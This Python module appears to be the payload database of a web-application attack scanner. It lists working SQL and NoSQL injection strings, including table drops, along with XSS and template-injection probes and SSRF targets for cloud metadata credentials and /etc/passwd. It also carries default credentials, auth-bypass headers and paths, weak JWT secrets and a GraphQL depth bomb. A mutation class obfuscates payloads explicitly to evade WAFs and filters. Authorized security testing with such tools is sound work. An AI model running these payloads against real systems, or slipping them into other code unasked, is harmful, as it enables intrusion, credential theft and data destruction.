"""
payloads/database.py — Internal Payload Database + Mutation Engine

All attack payloads organized by vulnerability class.
PayloadMutator generates encoded/obfuscated variants for WAF bypass.
"""
from __future__ import annotations

import base64
import html
import random
import string
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple, cast


# ═══════════════════════════════════════════════════════════════════
# SQL INJECTION
# ═══════════════════════════════════════════════════════════════════
SQLI = {
    "error_based": [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "admin'--",
        "' HAVING 1=1--",
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT NULL,table_name FROM information_schema.tables--",
        "'; INSERT INTO users VALUES ('pwned','pwned')--",
        "1; DROP TABLE users--",
    ],
    "blind_time": [
        "1' AND SLEEP(3)--",
        "1' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "1' AND BENCHMARK(5000000,MD5(1))--",
        "1; SELECT pg_sleep(3)--",
        "1' OR SLEEP(3)--",
    ],
    "blind_bool": [
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "1' AND LENGTH(password)>5--",
    ],
    "error_patterns": [
        r"SQL syntax.*?error",
        r"mysql_fetch",
        r"ORA-\d{5}",
        r"Microsoft OLE DB",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
        r"pg_query.*failed",
        r"SQLite.*error",
        r"syntax error at or near",
        r"SQLSTATE\[",
        r"Incorrect syntax near",
        r"mysql_num_rows",
        r"You have an error in your SQL",
        r"Warning.*mysqli",
        r"PDOException",
        r"com\.mysql\.jdbc",
        r"Column count doesn't match",
        r"Operand should contain",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# NOSQL INJECTION
# ═══════════════════════════════════════════════════════════════════
NOSQLI = {
    "operators": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": "invalid_value_xyz"}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"$gt": "", "$lt": "~"}',
        '{"$where": "1==1"}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}',
    ],
    "string_escape": [
        "' || '1'=='1",
        "'; return true; var dummy='",
        "\" || \"1\"==\"1",
        "true, $where: '1 == 1'",
    ],
    "json_injection": [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": "admin", "password": {"$gt": ""}}',
        '{"$where": "this.username == \'admin\'"}',
    ],
    "url_params": [
        "[$ne]=1",
        "[%24ne]=1",
        "[$gt]=",
        "[%24gt]=",
        "[$regex]=.*",
    ],
    "error_patterns": [
        r"MongoError",
        r"MongoServerError",
        r"BSONTypeError",
        r"CastError.*ObjectId",
        r"ValidationError.*mongoose",
        r"\$where.*not allowed",
        r"bad \$push value",
        r"unknown operator",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# XSS / TEMPLATE INJECTION
# ═══════════════════════════════════════════════════════════════════
XSS = {
    "reflected": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "';alert('XSS');//",
        "\"><img src=1 onerror=alert(1)>",
    ],
    "dom_based": [
        "#<script>alert('XSS')</script>",
        "?search=<script>alert(1)</script>",
        "?redirect=javascript:alert(1)",
    ],
    "ssti_probes": [
        # Jinja2/Twig/Tornado
        ("{{7*7}}",           "49"),
        ("{{7*'7'}}",         "7777777"),
        ("{% debug %}",       ""),
        # Mako/Genshi
        ("${7*7}",            "49"),
        # EL (Java)
        ("#{7*7}",            "49"),
        # ERB (Ruby)
        ("<%= 7*7 %>",        "49"),
        # Angular
        ("{{constructor.constructor('alert(1)')()}}",  ""),
        # Smarty
        ("{7*7}",             "49"),
    ],
    "stored_indicators": [
        "<script>", "onerror=", "onload=", "javascript:",
        "document.cookie", "<iframe", "<svg", "alert(",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# SSRF
# ═══════════════════════════════════════════════════════════════════
SSRF = {
    "localhost": [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://0177.0.0.1",        # Octal
        "http://2130706433",         # Decimal
        "http://0x7f000001",         # Hex
        "http://127.1",              # Short
    ],
    "internal_services": [
        "http://127.0.0.1:6379",    # Redis
        "http://127.0.0.1:11211",   # Memcached
        "http://127.0.0.1:27017",   # MongoDB
        "http://127.0.0.1:5432",    # PostgreSQL
        "http://127.0.0.1:3306",    # MySQL
        "http://127.0.0.1:8080",    # Local app
        "http://127.0.0.1:9200",    # Elasticsearch
        "http://127.0.0.1:8500",    # Consul
    ],
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",                          # Alibaba
        "http://169.254.169.254/metadata/v1/",                               # DigitalOcean
    ],
    "file_read": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///windows/system32/drivers/etc/hosts",
    ],
    "dns_rebind_bypass": [
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
    ],
    "url_params": [
        "url", "uri", "link", "src", "source", "dest", "destination",
        "redirect", "next", "return", "returnUrl", "return_url", "callback",
        "webhook", "webhook_url", "notify", "notify_url", "image", "imageUrl",
        "image_url", "file", "path", "fetch", "load", "import", "endpoint",
    ],
    "response_patterns": [
        r"ami-id|instance-id|iam/security-credentials|AccessKeyId|SecretAccessKey",
        r"root:x:0:0|daemon:|www-data:|nobody:",
        r"\[fonts\]|for 16-bit|; for DOS|Windows IP Configuration",
        r"computeMetadata|metadata\.google\.internal",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# AUTHENTICATION
# ═══════════════════════════════════════════════════════════════════
AUTH = {
    "default_credentials": [
        ("admin",          "admin"),
        ("admin",          "password"),
        ("admin",          "123456"),
        ("admin",          "admin123"),
        ("admin",          ""),
        ("root",           "root"),
        ("root",           "toor"),
        ("root",           "password"),
        ("administrator",  "administrator"),
        ("administrator",  "password"),
        ("test",           "test"),
        ("user",           "user"),
        ("guest",          "guest"),
        ("api",            "api"),
        ("api",            "apikey"),
        ("demo",           "demo"),
        ("superadmin",     "superadmin"),
        ("sa",             ""),
        ("operator",       "operator"),
        ("support",        "support"),
    ],
    "header_bypass": [
        {"X-Original-URL":             "/admin"},
        {"X-Rewrite-URL":              "/admin"},
        {"X-Custom-IP-Authorization":  "127.0.0.1"},
        {"X-Forwarded-For":            "127.0.0.1"},
        {"X-Remote-IP":                "127.0.0.1"},
        {"X-Client-IP":                "127.0.0.1"},
        {"X-Real-IP":                  "127.0.0.1"},
        {"X-Originating-IP":           "127.0.0.1"},
        {"True-Client-IP":             "127.0.0.1"},
        {"X-ProxyUser-Ip":             "127.0.0.1"},
    ],
    "path_bypass": [
        "/admin/",       "/ADMIN",        "//admin",
        "/admin;/",      "/./admin",      "/%2fadmin",
        "/admin%20",     "/admin%09",     "/admin#",
        "/admin%00",     "/admin..;/",
    ],
    "login_paths": [
        "/auth/login", "/login", "/signin", "/api/login",
        "/api/v1/auth/login", "/api/v1/login", "/api/v2/auth/login",
        "/oauth/token", "/auth/token", "/token", "/api/token",
        "/api/authenticate", "/authenticate", "/session",
        "/api/session", "/api/auth", "/api/v1/auth",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# JWT ATTACKS
# ═══════════════════════════════════════════════════════════════════
JWT_ATTACKS = {
    "weak_secrets": [
        "secret", "password", "123456", "admin", "test",
        "jwt_secret", "jwt-secret", "your-256-bit-secret",
        "supersecretkey", "changeme", "development", "production",
        "", "null", "undefined", "HS256", "RS256", "none", "JWT",
        "access_secret", "refresh_secret", "app_secret", "key",
        "private", "public", "signing_key", "token_secret",
    ],
    "none_alg_variants": ["none", "None", "NONE", "nOnE", "NoNe"],
    "jwks_paths": [
        "/.well-known/jwks.json", "/jwks.json", "/api/auth/jwks",
        "/oauth/.well-known/jwks.json", "/.well-known/openid-configuration",
    ],
    "kid_payloads": [
        "../../../../../../../../etc/passwd",
        "/dev/null",
        "../../dev/null",
        "0",
        "' OR 1=1--",
        "https://raw.githubusercontent.com/google/security-research/main/pwn.jwk"
    ],
}

# ═══════════════════════════════════════════════════════════════════
# GRAPHQL
# ═══════════════════════════════════════════════════════════════════
GRAPHQL_PAYLOADS = {
    "introspection_full": """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name description isDeprecated deprecationReason
  }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType {
    kind name
    ofType { kind name ofType { kind name } }
  }
}""",
    "introspection_simple":   "{ __schema { types { name } } }",
    "typename_probe":         "{ __typename }",
    "depth_bomb":             "{ a { b { c { d { e { f { g { h { i { j { k { __typename } } } } } } } } } } } }",
    "batch_single":           [{"query": "{ __typename }"}],
    "field_suggestion":       "{ usr { id } }",
    "paths": [
        "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
        "/gql", "/query", "/graphql/console", "/api/v1/graphql",
        "/api/v2/graphql", "/playground",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# SECURITY HEADERS
# ═══════════════════════════════════════════════════════════════════
SECURITY_HEADERS = {
    "required": {
        "Strict-Transport-Security":  "max-age=31536000; includeSubDomains; preload",
        "Content-Security-Policy":    "default-src 'self'",
        "X-Content-Type-Options":     "nosniff",
        "X-Frame-Options":            "DENY",
        "Referrer-Policy":            "strict-origin-when-cross-origin",
        "Permissions-Policy":         "camera=(), microphone=(), geolocation=()",
    },
    "leaking": [
        "Server", "X-Powered-By", "X-AspNet-Version",
        "X-AspNetMvc-Version", "X-Runtime", "X-Generator", "Via",
    ],
}

# ═══════════════════════════════════════════════════════════════════
# SENSITIVE DATA REGEX PATTERNS  (pattern, label, severity)
# ═══════════════════════════════════════════════════════════════════
SENSITIVE_PATTERNS: List[Tuple[str, str, str]] = [
    (r'(?i)(password|senha|pwd)\s*[=:]\s*\S+',                   "Plaintext Password",  "CRITICAL"),
    (r'-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----',                 "Private Key",         "CRITICAL"),
    (r'(?i)(aws_access_key_id|aws_secret)\s*[=:]\s*\S+',          "AWS Credential",      "CRITICAL"),
    (r'\b4[0-9]{12}(?:[0-9]{3})?\b',                              "Visa Card Number",    "CRITICAL"),
    (r'\b5[1-5][0-9]{14}\b',                                      "Mastercard Number",   "CRITICAL"),
    (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']?[\w\-]{10,}',     "API Key",             "HIGH"),
    (r'(?i)(secret|token|bearer)\s*[=:]\s*["\']?[\w\-\.]{10,}',  "Secret/Token",        "HIGH"),
    (r'(?i)(mongodb|mysql|postgresql|redis)://[^\s"\']+',         "Connection String",   "HIGH"),
    (r'\b\d{3}\.\d{3}\.\d{3}-\d{2}\b',                           "CPF",                 "HIGH"),
    (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',     "Email Address",       "MEDIUM"),
    (r'(?i)debug\s*=\s*true',                                     "Debug Mode",          "MEDIUM"),
    (r'(?i)stack\s*trace|traceback\s*\(most\s*recent',            "Stack Trace",         "MEDIUM"),
]

# ═══════════════════════════════════════════════════════════════════
# DISCOVERY PATHS
# ═══════════════════════════════════════════════════════════════════
DISCOVERY_PATHS: List[str] = [
    # Versioning
    "/api", "/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/v3",
    # Auth
    "/auth", "/auth/login", "/login", "/signin", "/logout",
    "/oauth/token", "/api/auth", "/api/v1/auth/login",
    # Users
    "/users", "/api/users", "/api/v1/users", "/user",
    "/me", "/profile", "/account", "/accounts", "/members",
    # Admin
    "/admin", "/administrator", "/api/admin", "/management",
    "/dashboard", "/console", "/control", "/panel",
    # Health/Debug
    "/health", "/healthz", "/status", "/ping", "/info",
    "/metrics", "/debug", "/env", "/config", "/settings",
    # Docs
    "/docs", "/swagger", "/swagger-ui", "/swagger-ui.html",
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/api-docs", "/redoc", "/.well-known/openapi",
    # GraphQL
    "/graphql", "/graphiql", "/gql", "/api/graphql",
    # Spring Boot Actuator
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/beans", "/actuator/mappings", "/actuator/info",
    "/actuator/dump", "/actuator/trace",
    # Sensitive files
    "/.env", "/.git/config", "/backup", "/dump", "/export",
    "/.well-known/security.txt",
]


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════

class PayloadMutator:
    """
    Generates obfuscated/encoded variants of payloads to bypass WAF/filters.
    Each mutation preserves the semantic meaning while changing the surface.
    """

    @staticmethod
    def url_encode(p: str) -> str:
        return urllib.parse.quote(p, safe="")

    @staticmethod
    def double_url_encode(p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")

    @staticmethod
    def html_encode(p: str) -> str:
        return html.escape(p)

    @staticmethod
    def base64_encode(p: str) -> str:
        return base64.b64encode(p.encode()).decode()

    @staticmethod
    def hex_encode(p: str) -> str:
        return "".join(f"%{ord(c):02x}" for c in p)

    @staticmethod
    def unicode_escape(p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in p)

    @staticmethod
    def case_swap(p: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))

    @staticmethod
    def sql_comment_split(p: str) -> str:
        """Inserts SQL comments to bypass keyword-based filters."""
        result = p
        for kw in ["SELECT", "UNION", "INSERT", "UPDATE", "DROP",
                   "DELETE", "OR", "AND", "WHERE", "FROM"]:
            kw_str = str(kw)
            first_char = str(cast(Any, kw_str)[0:1])
            rest = str(cast(Any, kw_str)[1:])
            result = result.replace(kw, f"/*{first_char}*/{rest}")
        return result.replace(" ", "/**/")

    @staticmethod
    def null_byte(p: str) -> str:
        return p + "%00"

    @staticmethod
    def tab_substitute(p: str) -> str:
        return p.replace(" ", "\t")

    @classmethod
    def all_mutations(cls, payload: str) -> List[str]:
        """Returns all mutated variants of a payload (deduped, original first)."""
        fns = [
            cls.url_encode, cls.double_url_encode, cls.html_encode,
            cls.base64_encode, cls.hex_encode, cls.case_swap,
            cls.sql_comment_split, cls.null_byte,
        ]
        results = [payload]
        for fn in fns:
            try:
                v = fn(payload)
                if v not in results:
                    results.append(v)
            except Exception:
                pass
        return results

    @classmethod
    def mutate(cls, payload: str, techniques: Optional[List[str]] = None) -> List[str]:
        """
        Returns mutations using only the specified techniques.
        techniques: list of method names, or None for all.
        """
        if techniques is None:
            return cls.all_mutations(payload)

        method_map = {
            "url":      cls.url_encode,
            "double":   cls.double_url_encode,
            "html":     cls.html_encode,
            "base64":   cls.base64_encode,
            "hex":      cls.hex_encode,
            "case":     cls.case_swap,
            "comment":  cls.sql_comment_split,
            "null":     cls.null_byte,
        }
        results = [payload]
        for name in techniques:
            fn = method_map.get(name)
            if fn:
                try:
                    v = fn(payload)
                    if v not in results:
                        results.append(v)
                except Exception:
                    pass
        return results
